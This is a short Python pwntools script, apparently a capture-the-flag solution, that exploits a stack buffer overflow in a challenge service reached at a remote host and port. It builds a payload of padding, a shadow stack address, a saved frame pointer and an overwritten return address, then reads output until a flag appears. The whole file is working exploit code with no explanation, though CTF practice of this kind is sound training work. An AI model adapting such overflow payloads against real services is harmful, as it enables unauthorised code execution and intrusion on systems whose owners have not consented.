
from binascii import hexlify, unhexlify
from pwn import *

saved_ebp   = "d0dcffffff7f0000"        #7fffffdcd0

jump_adress = "4e10400000000000"    #40104e
shadow_stack_addr = "7022600000000000" #602270
addrUsername =          "40dcffffff7f0000"  #muss correcte addresse sein, weil darauf wieder zugegriffen wird :)
nullbytes = "00000000"
#p = process('./step4')
p = remote( "dumbistan.life", 50040)

print p.recv()

p.sendline('1')

username = 'A' * 92 + unhexlify(nullbytes) + unhexlify(shadow_stack_addr) + unhexlify(addrUsername) + unhexlify(saved_ebp) + unhexlify(jump_adress)
password = unhexlify(jump_adress)

p.sendline(username)
p.sendline(password)

print p.recv()

p.sendline('2')

while True:
    try:
        recv = p.recv()
        print recv
        if ('flag{' in recv):
            break
    except EOFError:
        print "----> Connection closed"
        break
